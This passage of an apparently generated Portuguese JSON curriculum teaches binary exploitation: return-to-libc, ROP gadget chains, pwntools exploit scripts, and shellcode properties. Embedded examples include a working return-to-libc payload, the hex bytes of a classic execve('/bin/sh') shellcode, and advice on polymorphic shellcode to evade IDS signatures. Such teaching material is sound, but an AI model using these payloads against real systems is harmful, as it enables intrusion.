                                    "Encontrar endereço da string '/bin/sh' com strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'.",
                                    "Confirmar em GDB: gdb ./vuln, run com input crash, usar info proc mappings e find &system.",
                                    "Anotar endereços: system_addr, binsh_addr."
                                  ],
                                  "verification": "Endereços de system() e '/bin/sh' identificados corretamente e validados no GDB.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "ldd",
                                    "objdump",
                                    "strings",
                                    "GDB",
                                    "libc.so.6"
                                  ],
                                  "tips": "Salve os endereços em um arquivo; rode em root se necessário para consistência.",
                                  "learningObjective": "Dominar ferramentas para extração de símbolos e strings de bibliotecas compartilhadas.",
                                  "commonMistakes": [
                                    "Confundir endereços de diferentes versões de libc",
                                    "Ignorar offset base da libc",
                                    "Usar addresses PIE"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir o Payload Return-to-Libc",
                                  "subSteps": [
                                    "Usar GDB para encontrar offset exato do buffer até EIP: cyclic pattern com gdb-peda.",
                                    "Estruturar payload: [junk de offset bytes] + [system_addr] + [binsh_addr] (simplificado para ROP básica).",
                                    "Criar script Python: struct.pack para little-endian, ex: payload = b'A'*offset + p32(system_addr) + p32(binsh_addr).",
                                    "Testar payload no GDB: run < payload, set disassembly-flavor intel.",
                                    "Ajustar para chain se necessário: adicionar pop rdi; ret para passar arg em 64-bit, mas foque 32-bit."
                                  ],
                                  "verification": "No GDB, EIP é sobrescrito corretamente por system_addr e shell spawna ao continuar.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python3",
                                    "pwntools ou struct",
                                    "GDB com peda/py-gdb",
                                    "Cyclic pattern generator"
                                  ],
                                  "tips": "Use pwntools para automação: from pwn import *; p32(address); context.arch='i386'.",
                                  "learningObjective": "Construir payloads que redirecionam controle para funções existentes sem injetar código.",
                                  "commonMistakes": [
                                    "Endianness errada (use little-endian)",
                                    "Offset incorreto do buffer",
                                    "Endereços desalinhados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar e Analisar o Exploit",
                                  "subSteps": [
                                    "Executar exploit fora do GDB: python exploit.py | ./vuln e verificar shell interativa.",
                                    "Confirmar sem W^X: note que código não é executado da stack, apenas redirecionamento.",
                                    "Analisar com strace ou ltrace para ver chamada system('/bin/sh').",
                                    "Testar robustez: múltiplas execuções, variações de input.",
                                    "Limpar: reabilitar ASLR e documentar lições."
                                  ],
                                  "verification": "Shell root ou interativa obtida sem crash, comando como 'whoami' funciona.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Exploit script Python",
                                    "strace/ltrace",
                                    "Terminal"
                                  ],
                                  "tips": "Pipe output para evitar EOF; use disown ou nohup se background.",
                                  "learningObjective": "Validar exploit em cenários reais e entender limitações como W^X.",
                                  "commonMistakes": [
                                    "Shell morre por EOF",
                                    "Não alinhar stack",
                                    "Ignorar NX bit"
                                  ]
                                }
                              ],
                              "practicalExample": "Programa C vuln.c: #include <string.h>; int main(int argc, char** argv) { char buf[64]; strcpy(buf, argv[1]); } Compilar como acima. Endereços exemplo (Ubuntu 32-bit): system@0xf7e42b70, /bin/sh@0xf7f3d3e9. Payload Python: from pwn import *; p = process('./vuln'); offset=112; payload = b'A'*offset + p32(0xf7e42b70) + p32(0xf7f3d3e9); p.sendline(payload); p.interactive(). Resultado: $ whoami (shell ganha).",
                              "finalVerifications": [
                                "Shell interativa spawna sem injetar código na stack.",
                                "Endereços de system() e '/bin/sh' corretos via ldd/objdump.",
                                "Exploit funciona consistentemente sem ASLR.",
                                "Nenhum código shellcode é escrito na memória.",
                                "Comando system('/bin/sh') confirmado via ltrace.",
                                "Ambiente restaurado (ASLR reabilitado)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de endereços libc (100% match).",
                                "Payload constrói ROP chain válida sem erros de alinhamento.",
                                "Sucesso em obter shell em <5 tentativas.",
                                "Explicação clara de bypass W^X.",
                                "Documentação completa de ferramentas e comandos usados.",
                                "Análise de falhas comuns evitadas."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: Entendimento de call/ret e stack frames.",
                                "Programação em C: Gerenciamento de buffers e linking dinâmico.",
                                "Sistemas Operacionais: Carregamento de bibliotecas e ASLR/NX.",
                                "Redes e Segurança: Fundamentos de pentesting e CTFs.",
                                "Ferramentas de Debug: Uso avançado de GDB e disassemblers."
                              ],
                              "realWorldApplication": "Em pentesting ético e bug bounties, return-to-libc é usado para bypassar proteções NX/W^X em binários legados, permitindo execução de comandos remotos em serviços vulneráveis como web servers sem shellcode, comum em CTFs como PicoCTF ou competições de segurança."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3.3",
                            "name": "Introdução a ROP gadgets",
                            "description": "Usar ROPgadget ou rp++ para encontrar gadgets em binários ELF (pop rdi; ret), construindo chains básicas para bypass de NX, executando chamadas de sistema sem shellcode executável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de ROP e Gadgets",
                                  "subSteps": [
                                    "Estude o que é ROP (Return-Oriented Programming) e como ele explora binários sem execução de shellcode devido a NX/DEP.",
                                    "Aprenda sobre gadgets ROP: sequências curtas de instruções terminando em 'ret' (ex: pop rdi; ret).",
                                    "Revise o formato ELF e seções relevantes como .text para gadgets.",
                                    "Entenda o papel do stack pivot e controle do RIP em buffer overflows.",
                                    "Analise exemplos de gadgets comuns como pop rdi; ret para passar argumentos a funções."
                                  ],
                                  "verification": "Explique em suas palavras o que é um gadget ROP e liste 3 exemplos comuns com suas funções.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação ROPgadget",
                                    "Tutoriais ROP básicos (ex: LiveOverflow YouTube)",
                                    "Binário ELF vulnerável de exemplo"
                                  ],
                                  "tips": "Desenhe o stack antes/depois de um ROP chain para visualizar o fluxo.",
                                  "learningObjective": "Dominar os princípios teóricos de ROP para bypass de proteções de memória.",
                                  "commonMistakes": "Confundir gadgets com shellcode; ignorar alinhamento de stack (8 bytes em x64)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Configurar Ferramentas ROPgadget e rp++",
                                  "subSteps": [
                                    "Instale ROPgadget via pip: 'pip install ROPgadget'.",
                                    "Instale rp++ clonando o repositório do GitHub e compilando.",
                                    "Teste as ferramentas em um binário ELF simples: 'ROPgadget --binary vuln.elf'.",
                                    "Explore opções como --string, --only 'pop|ret' para filtrar gadgets específicos.",
                                    "Configure gdb com pwndbg ou gef para depuração posterior."
                                  ],
                                  "verification": "Execute ROPgadget em um binário e capture saída com pelo menos 5 gadgets listados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python 3+",
                                    "Git",
                                    "Binário ELF de teste (ex: de picoCTF)",
                                    "GDB com extensões"
                                  ],
                                  "tips": "Use virtualenv para isolar dependências e evitar conflitos.",
                                  "learningObjective": "Configurar ambiente pronto para análise de gadgets em binários ELF.",
                                  "commonMistakes": "Executar em binários ASLR-enabled sem desabilitar; esquecer de strip/debug symbols."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Gadgets em Binários ELF",
                                  "subSteps": [
                                    "Carregue um binário ELF vulnerável sem ASLR/NX para prática.",
                                    "Use ROPgadget para listar gadgets: filtre por 'pop rdi; ret', 'ret', etc.",
                                    "Experimente rp++ para visualização gráfica de gadgets.",
                                    "Anote endereços de gadgets úteis (ex: pop rdi para primeiro arg de system).",
                                    "Verifique gadgets em gdb: 'gdb vuln.elf', 'disas main' e procure manualmente."
                                  ],
                                  "verification": "Liste 5 gadgets relevantes de um binário com endereços e assembly exatos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Binário ELF vulnerável (ex: 64-bit buffer overflow)",
                                    "ROPgadget",
                                    "rp++",
                                    "GDB"
                                  ],
                                  "tips": "Procure gadgets em libc também com 'ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6'.",
                                  "learningObjective": "Extrair gadgets confiáveis de binários para construção de chains.",
                                  "commonMistakes": "Usar gadgets de binários diferentes; ignorar endianness em x86_64."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e Testar Chains ROP Básicas para Bypass NX",
                                  "subSteps": [
                                    "Identifique endereço de system() e '/bin/sh' string.",
                                    "Monte chain: pop rdi -> addr('/bin/sh') -> system().",
                                    "Escreva payload em Python com struct.pack para buffer overflow.",
                                    "Teste em gdb: defina breakpoints, execute e verifique shell spawn.",
                                    "Ajuste para alinhamento de stack com nop sled ou ret sled."
                                  ],
                                  "verification": "Execute exploit e obtenha shell interativa sem crash.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Python com pwntools",
                                    "Binário vulnerável",
                                    "GDB-PEDA/Pwndbg"
                                  ],
                                  "tips": "Use cyclic patterns (ex: pwntools cyclic) para encontrar offset exato.",
                                  "learningObjective": "Construir chains ROP funcionais para executar system calls.",
                                  "commonMistakes": "Offset incorreto no buffer; não alinhar stack (add rsp,8; ret); leak ASLR."
                                }
                              ],
                              "practicalExample": "Em um binário ELF 64-bit com buffer overflow em main(), use ROPgadget para encontrar 'pop rdi; ret' (0x401196), addr('/bin/sh')=0x601050, system=0x400590. Payload: junk + pop_rdi + sh_addr + system. Execute em gdb para spawn shell.",
                              "finalVerifications": [
                                "Lista gadgets corretos de um binário ELF usando ROPgadget.",
                                "Constrói chain ROP para chamar system('/bin/sh') sem erros.",
                                "Exploit funciona em gdb, spawnando shell interativa.",
                                "Explica papel de cada gadget na chain.",
                                "Identifica e corrige desalinhamento de stack.",
                                "Diferencia gadgets de binário vs libc."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets (endereços e assembly corretos).",
                                "Funcionalidade da chain ROP (shell executa sem crash).",
                                "Eficiência do payload (mínimo padding, alinhamento correto).",
                                "Compreensão teórica demonstrada em explicações.",
                                "Uso correto de ferramentas (filtros, opções avançadas).",
                                "Resolução de erros comuns (ASLR, NX bypass)."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86_64: Leitura de instruções e opcodes.",
                                "Análise de Binários: Ferramentas como objdump, readelf.",
                                "Exploração de Vulnerabilidades: Buffer overflows e mitigações (NX, ASLR).",
                                "Programação em Python: Pwntools para automação de exploits.",
                                "Segurança de Sistemas: Proteções DEP/W^X."
                              ],
                              "realWorldApplication": "Em pentests e CTFs (ex: HackTheBox, pwn.college), ROP é essencial para explorar binários protegidos por NX, permitindo execução de comandos remotos em serviços como SSH ou web apps vulneráveis, simulando ataques reais em software legado."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.1.1.3.4",
                            "name": "Testar exploit em ambiente controlado",
                            "description": "Montar payload completo com python (pwntools) para overflow remoto/local, obtendo shell interativa, considerando ASLR parcial e verificando com checksec.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e analisar o binário com checksec",
                                  "subSteps": [
                                    "Instalar pwntools via pip: pip install pwntools",
                                    "Baixar ou compilar o binário vulnerável em ambiente isolado (ex: VM com GDB-PEDA)",
                                    "Executar checksec no binário para identificar proteções: checksec ./vuln",
                                    "Verificar ASLR parcial: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space",
                                    "Configurar servidor local para teste remoto se aplicável (ex: nc -lvp 1234)"
                                  ],
                                  "verification": "Confirme que checksec mostra NX=NO, PIE=NO, ASLR parcial e pwntools instalado sem erros",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Binário vulnerável, pwntools, checksec tool, VM isolada, GDB",
                                  "tips": "Use uma VM snapshot para resetar o ambiente facilmente após testes",
                                  "learningObjective": "Entender o perfil de segurança do binário e configurar ambiente controlado",
                                  "commonMistakes": "Esquecer de desabilitar ASLR completamente ou testar em ambiente não isolado"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver payload básico para buffer overflow",
                                  "subSteps": [
                                    "Identificar offset do overflow usando cyclic pattern (ex: cyclic(200) do pwntools)",
                                    "Encontrar endereço da shellcode ou ROP gadget com objdump ou ROPgadget",
                                    "Montar payload: padding + return address + NOP sled + shellcode",
                                    "Testar localmente com python3 -c 'print(payload)' | ./vuln",
                                    "Ajustar para ASLR parcial usando leak de endereço ou partial overwrite"
                                  ],
                                  "verification": "O programa crasha com EIP controlado pelo payload (verifique com gdb)",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GDB, pwntools (cyclic), ROPgadget, binário vuln",
                                  "tips": "Use gdb-peda para visualizar stack e registers facilmente",
                                  "learningObjective": "Construir payload que sobrescreve return address considerando ASLR",
                                  "commonMistakes": "Calcular offset errado ou usar shellcode muito longo que excede buffer"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar script Python com pwntools para automação",
                                  "subSteps": [
                                    "Importar pwntools: from pwn import *",
                                    "Definir contexto: context.binary = './vuln'; p = process('./vuln') ou remote('localhost', 1234)",
                                    "Enviar payload: p.sendline(payload)",
                                    "Interagir: p.interactive() para shell",
                                    "Adicionar bypass ASLR: usar leak de libc ou partial ASLR guess"
                                  ],
                                  "verification": "Execute o script e obtenha shell interativa sem crash",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Editor de texto (VSCode), pwntools, binário vuln rodando",
                                  "tips": "Use log.level = 'debug' para ver tráfego de rede no remote",
                                  "learningObjective": "Automatizar exploit com pwntools para local e remoto",
                                  "commonMistakes": "Não definir architecture corretamente (context.arch='amd64') ou esquecer p.recvuntil()"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, depurar e verificar exploit completo",
                                  "subSteps": [
                                    "Executar script múltiplas vezes verificando consistência com ASLR parcial",
                                    "Usar gdb attach para depurar falhas: gdb.attach(p)",
                                    "Verificar shell: executar comandos como id, ls, cat flag.txt",
                                    "Documentar offsets e endereços usados",
                                    "Limpar: kill processos e resetar ASLR se necessário"
                                  ],
                                  "verification": "Shell interativa obtida em 90% das execuções, comandos executam corretamente",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GDB-PEDA, script Python, flag.txt simulada",
                                  "tips": "Grave sessão com script para replay: pwnlib.tubes.process.record()",
                                  "learningObjective": "Garantir confiabilidade do exploit em cenários reais controlados",
                                  "commonMistakes": "Ignorar variações de ASLR ou não testar remote vs local"
                                }
                              ],
                              "practicalExample": "Em um CTF, você tem o binário 'vuln' com buffer overflow em gets(). Use pwntools para criar payload que sobrescreve return para system('/bin/sh'), bypassando ASLR parcial com leak de stack canary parcial, obtendo shell remota via nc localhost 1234 e lendo flag{exploit_success}.",
                              "finalVerifications": [
                                "checksec confirma proteções identificadas corretamente",
                                "Payload obtém controle de EIP em gdb",
                                "Script pwntools roda sem erros e fornece shell interativa",
                                "ASLR parcial é contornado consistentemente",
                                "Comandos na shell (id, pwd) executam sem restrições",
                                "Nenhum crash ou segment fault em 5 execuções"
                              ],
                              "assessmentCriteria": [
                                "Payload montado corretamente com padding, ROP/shellcode e ASLR handling",
                                "Script pwntools usa context, process/remote e interactive adequadamente",
                                "Ambiente isolado usado, sem riscos reais",
                                "Documentação de offsets e verificações incluída",
                                "Exploit funciona local e remoto com >80% sucesso",
                                "Erros comuns evitados e depuração demonstrada"
                              ],
                              "crossCurricularConnections": [
                                "Programação Python: Uso avançado de bibliotecas (pwntools)",
                                "Redes: Comunicação TCP com remote() e netcat",
                                "Análise Reversa: Ferramentas como objdump, ROPgadget",
                                "Sistemas Operacionais: Entendimento de ASLR, stack, proteções ELF"
                              ],
                              "realWorldApplication": "Em pentests éticos ou bug bounties, testar exploits em labs controlados para validar vulnerabilidades buffer overflow em serviços reais, reportando CVEs sem causar dano, como em programas de segurança de empresas como Google ou HackerOne."
                            },
                            "estimatedTime": "3.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.2",
                    "name": "Shellcodes",
                    "description": "Códigos em assembly compactos projetados para injeção em memória e execução direta, permitindo comandos como chamadas de sistema.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.2.1",
                        "name": "Definição e Características dos Shellcodes",
                        "description": "Compreender o conceito fundamental de shellcodes como sequências compactas de instruções em assembly projetadas para injeção direta em memória, permitindo a execução de comandos como chamadas de sistema sem dependências de bibliotecas externas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.1.1",
                            "name": "Identificar as propriedades essenciais de um shellcode",
                            "description": "Reconhecer características como tamanho mínimo, ausência de null bytes, independência de posição (position-independent code) e foco em instruções básicas para evitar detecção em exploits de buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição e propósito de um shellcode",
                                  "subSteps": [
                                    "Leia a definição de shellcode como um pequeno pedaço de código de máquina projetado para ser injetado e executado em um processo alvo.",
                                    "Identifique o contexto típico: exploits de buffer overflow onde o shellcode é injetado via overflow para spawnar uma shell.",
                                    "Estude exemplos básicos de shellcodes em assembly x86, como o clássico spawn de /bin/sh.",
                                    "Anote o objetivo principal: executar código arbitrário com privilégios do processo vulnerável.",
                                    "Compare shellcode com payloads normais para destacar sua natureza compacta e auto-contida."
                                  ],
                                  "verification": "Escreva uma definição em suas próprias palavras e liste 3 contextos de uso; revise com um colega ou tutor.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação de shellcode (ex: Exploit-DB), editor de texto, exemplos de shellcode em hex"
                                  ],
                                  "tips": "Comece com shellcodes famosos como o de Aleph One para contextualizar historicamente.",
                                  "learningObjective": "Definir shellcode e seu papel em exploits de injeção de código.",
                                  "commonMistakes": [
                                    "Confundir shellcode com scripts de alto nível; ignorar o foco em código de máquina puro."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a propriedade de tamanho mínimo",
                                  "subSteps": [
                                    "Meça o tamanho de shellcodes exemplo em bytes (tipicamente <100 bytes para x86).",
                                    "Explique por que o tamanho deve ser mínimo: limitado pelo tamanho do buffer overflow.",
                                    "Otimize um shellcode simples removendo bytes desnecessários usando ferramentas como NASM.",
                                    "Compare tamanhos: shellcode otimizado vs. código equivalente em C compilado.",
                                    "Teste execução em um ambiente controlado para confirmar funcionalidade sem excessos."
                                  ],
                                  "verification": "Forneça um shellcode com tamanho <50 bytes que funcione e justifique otimizações.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM assembler, debugger como GDB, exemplos de shellcode minimalistas"
                                  ],
                                  "tips": "Use instruções de um byte como 'inc' ou 'dec' para manipular registradores sem overhead.",
                                  "learningObjective": "Reconhecer e justificar o requisito de shellcode compacto para exploits reais.",
                                  "commonMistakes": [
                                    "Incluir chamadas de sistema desnecessárias que incham o código; não testar limites de buffer."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar ausência de null bytes e independência de posição (PIC)",
                                  "subSteps": [
                                    "Examine shellcodes em hex para detectar bytes 0x00 (nulls) e explique por que strings C terminam neles, quebrando payloads.",
                                    "Estude técnicas PIC: usar registradores relativos, jumps relativos e evitar endereços absolutos.",
                                    "Converta um shellcode não-PIC para PIC usando offsets relativos (ex: call/pop trick).",
                                    "Use objdump ou ndisasm para disassemblar e verificar ausência de nulls e endereços fixos.",
                                    "Teste injeção em um buffer overflow vulnerável para validar execução PIC."
                                  ],
                                  "verification": "Disasseble um shellcode PIC sem nulls e demonstre execução em endereço aleatório.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Objdump, ndisasm, vulnerable C program com buffer overflow, GDB"
                                  ],
                                  "tips": "Evite instruções como MOV com immediatos que geram nulls; prefira XOR para zerar registradores.",
                                  "learningObjective": "Detectar e mitigar null bytes e dependências de posição em shellcodes.",
                                  "commonMistakes": [
                                    "Usar mov abs que insere nulls; assumir endereços fixos sem testar PIC."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecer foco em instruções básicas para evitar detecção",
                                  "subSteps": [
                                    "Liste instruções comuns em shellcodes: push, pop, mov, jmp, call, int 0x80 (syscalls).",
                                    "Analise por que evitar instruções raras ou de alto nível: assinaturas de IDS/IPS detectam padrões.",
                                    "Compare shellcode stealthy vs. verboso: conte frequência de opcodes exóticos.",
                                    "Polymorfe um shellcode simples alterando instruções equivalentes sem mudar funcionalidade.",
                                    "Simule detecção com strings ou YARA rules básicas em um shellcode."
                                  ],
                                  "verification": "Identifique 5 instruções básicas em um shellcode e sugira 2 alternativas polimórficas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Lista de opcodes x86, YARA rules para shellcode, editor hex"
                                  ],
                                  "tips": "Priorize instruções de 1-2 bytes; use loops simples em vez de repetições.",
                                  "learningObjective": "Avaliar shellcodes por stealth baseado em instruções básicas e comuns.",
                                  "commonMistakes": [
                                    "Incluir instruções floating-point ou SSE que são raras e detectáveis."
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o shellcode clássico x86 para execve('/bin/sh'): \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80. Verifique: 23 bytes (mínimo), sem nulls, PIC via push/string, usa syscalls básicas (execve). Injete em um buffer overflow em um programa C vulnerável e execute para spawnar shell.",
                              "finalVerifications": [
                                "Liste corretamente as 4 propriedades essenciais: tamanho mínimo, sem null bytes, PIC, instruções básicas.",
                                "Analise um shellcode hex desconhecido e identifique todas as propriedades presentes.",
                                "Otimize um shellcode dado para atender todas as propriedades.",
                                "Explique falhas em um shellcode não-conforme (ex: com nulls).",
                                "Demonstre execução PIC em GDB com ASLR ativado.",
                                "Identifique detecções potenciais baseadas em instruções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de cada propriedade (100% cobertura).",
                                "Exemplos práticos com evidências (hex dumps, disasm).",
                                "Justificativas técnicas claras ligadas a exploits reais.",
                                "Capacidade de correção/otimização de shellcodes defeituosos.",
                                "Demonstração de verificação via ferramentas (GDB, objdump).",
                                "Compreensão de implicações em detecção/evasão."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura de Computadores: Disassembly e opcodes x86.",
                                "Sistemas Operacionais: Syscalls e execução de processos.",
                                "Programação em C: Buffer overflows e vulnerabilidades de memória.",
                                "Redes e Segurança: Detecção de intrusão (IDS) e análise de malware.",
                                "Engenharia Reversa: Ferramentas como IDA Pro ou Ghidra para análise."
                              ],
                              "realWorldApplication": "Em pentesting e bug bounties, identificar propriedades de shellcode permite criar exploits stealthy para buffer overflows em serviços reais (ex: vulnerabilidades em software legado). Em análise de malware, reconhecer shellcodes ruins ajuda a detectar payloads em amostras maliciosas durante incident response."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.2",
                            "name": "Diferenciar shellcodes para arquiteturas 32 e 64 bits",
                            "description": "Comparar registros, chamadas de sistema (int 0x80 vs syscall) e convenções de pilha entre x86 (32 bits) e x64 (AMD64), identificando adaptações necessárias para compatibilidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Registradores em Arquiteturas x86 (32 bits) e x64 (AMD64)",
                                  "subSteps": [
                                    "Liste os registradores de uso geral em x86: EAX, EBX, ECX, EDX, ESI, EDI (32 bits).",
                                    "Identifique extensões em x64: RAX, RBX, RCX, RDX, RSI, RDI, R8-R15 (64 bits).",
                                    "Compare tamanhos: 32 bits vs 64 bits, e acessos parciais (ex: EAX é low 32 bits de RAX).",
                                    "Examine registradores de segmento e flags: diferenças mínimas em x64 (segmentos flatten).",
                                    "Anote registradores específicos para shellcodes, como ESP/RSP para pilha."
                                  ],
                                  "verification": "Crie uma tabela comparativa com todos os registradores principais e seus equivalentes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel/AMD manuals (Vol. 2 para x86/x64)",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Use mnemônicos visuais: 'E' para 32-bit, 'R' para 64-bit.",
                                  "learningObjective": "Entender e mapear registradores entre arquiteturas para adaptação de código assembly.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32 com 64 bits (ex: usar EAX em x64 sem truncar)",
                                    "Ignorar novos registradores R8-R15 disponíveis apenas em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Chamadas de Sistema: int 0x80 vs syscall",
                                  "subSteps": [
                                    "Em x86: Explique int 0x80, com EAX = syscall number, EBX/params em registradores sequenciais.",
                                    "Em x64: Descreva syscall instruction, RAX = syscall number, RDI/RSI/RDX/R10/R8/R9 para params.",
                                    "Compare numeração de syscalls: muitas iguais, mas verifique /usr/include/asm/unistd.h para cada arch.",
                                    "Monte exemplos assembly simples: execve em ambas usando as instruções corretas.",
                                    "Teste em ambiente controlado com gdb para observar comportamento."
                                  ],
                                  "verification": "Escreva e compile dois snippets assembly: um int 0x80 (x86) e um syscall (x64) para exit(0).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB debugger",
                                    "Arquivos unistd.h para x86 e x64"
                                  ],
                                  "tips": "Em x64, R10 substitui RCX para 4º param devido a calling convention.",
                                  "learningObjective": "Diferenciar mecanismos de syscall e mapear parâmetros corretamente entre arches.",
                                  "commonMistakes": [
                                    "Usar int 0x80 em x64 (funciona mas deprecated/slow)",
                                    "Errar ordem de params em x64 (não EBX->RDX, mas RDI->R9)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Convenções de Pilha e Passagem de Argumentos",
                                  "subSteps": [
                                    "x86: stdcall/cdecl - args na pilha (right-to-left), caller limpa pilha em cdecl.",
                                    "x64: System V AMD64 ABI - primeiros 6 args em registradores (RDI,RSI,RDX,RCX,R8,R9), resto na pilha (16-byte aligned).",
                                    "Analise alinhamento de pilha: x86 4-byte, x64 16-byte (SSE).",
                                    "Examine RSP vs ESP: offsets e pushes/pops em shellcodes.",
                                    "Identifique impactos em shellcodes: null-free bytes, ROP chains adaptadas."
                                  ],
                                  "verification": "Desenhe diagramas de pilha para uma chamada execve em ambas arches.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "System V ABI PDF",
                                    "Intel manuals seção calling conventions"
                                  ],
                                  "tips": "Lembre: x64 prioriza registradores para performance, reduz uso de pilha.",
                                  "learningObjective": "Mapear convenções de ABI para escrever shellcodes portáteis ou adaptados.",
                                  "commonMistakes": [
                                    "Não alinhar pilha em x64 (causa segfaults)",
                                    "Assumir pilha-based args em x64 como em x86"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Adaptação de Shellcodes entre 32 e 64 bits",
                                  "subSteps": [
                                    "Pegue um shellcode x86 conhecido (ex: execve /bin/sh de exploit-db).",
                                    "Analise bytes: identifique registradores, syscall, pilha.",
                                    "Converta para x64: ajuste registradores, mude int 0x80 para syscall, reordene params.",
                                    "Teste em ambiente: use metasploit msfvenom ou assemble manualmente.",
                                    "Compare tamanhos e eficiência: x64 geralmente maior mas mais registers."
                                  ],
                                  "verification": "Gere e execute shellcodes adaptados em VMs x86 e x64 separadas.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "VMs Linux x86/x64",
                                    "NASM/GAS",
                                    "pwntools ou python para shellcode tester"
                                  ],
                                  "tips": "Use objdump -d para disassemble e verificar.",
                                  "learningObjective": "Aplicar diferenças para criar shellcodes funcionais em ambas arches.",
                                  "commonMistakes": [
                                    "Bad chars introduzidos na adaptação (ex: null bytes)",
                                    "Não testar em kernel correto (syscall nums variam por versão)"
                                  ]
                                }
                              ],
                              "practicalExample": "Adapte o shellcode x86 execve('/bin/sh') de 23 bytes: \\x31\\c0...int 0x80 para x64: use xor rax,rax; mov rdi, string; syscall, ajustando RDI para ptr de /bin/sh e stack alignment, resultando em ~35 bytes funcional em x64.",
                              "finalVerifications": [
                                "Pode listar 8+ diferenças chave entre shellcodes x86/x64.",
                                "Consegue disassemblar e explicar um shellcode híbrido.",
                                "Adapta com sucesso um shellcode de 32 para 64 bits sem erros.",
                                "Identifica corretamente syscalls numbers para ambas arches.",
                                "Explica impacto de ABI em shellcode design.",
                                "Testa shellcodes em gdb sem crashes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e syscalls (90%+ correto).",
                                "Qualidade dos diagramas/tabelas comparativos (clareza e completude).",
                                "Sucesso na execução de shellcodes adaptados (funciona em ambas arches).",
                                "Profundidade na análise de erros comuns e adaptações.",
                                "Criatividade em conexões com exploits reais.",
                                "Eficiência temporal: completa em <4h."
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language Programming: sintaxe e instruções.",
                                "Operating Systems: syscalls e kernel interfaces.",
                                "Computer Architecture: ISA differences x86/x64.",
                                "Ethical Hacking: shellcode em pentesting.",
                                "Reverse Engineering: disassembly tools."
                              ],
                              "realWorldApplication": "Em desenvolvimento de exploits para CTFs/pentests, adaptando payloads para targets 32/64-bit (ex: buffer overflow em serviços legacy vs modernos), ou análise de malware cross-platform."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.3",
                            "name": "Explicar o papel das chamadas de sistema em shellcodes",
                            "description": "Analisar como instruções como execve('/bin/sh') são implementadas via syscalls para spawnar shells interativas, incluindo configuração de argumentos em registradores específicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
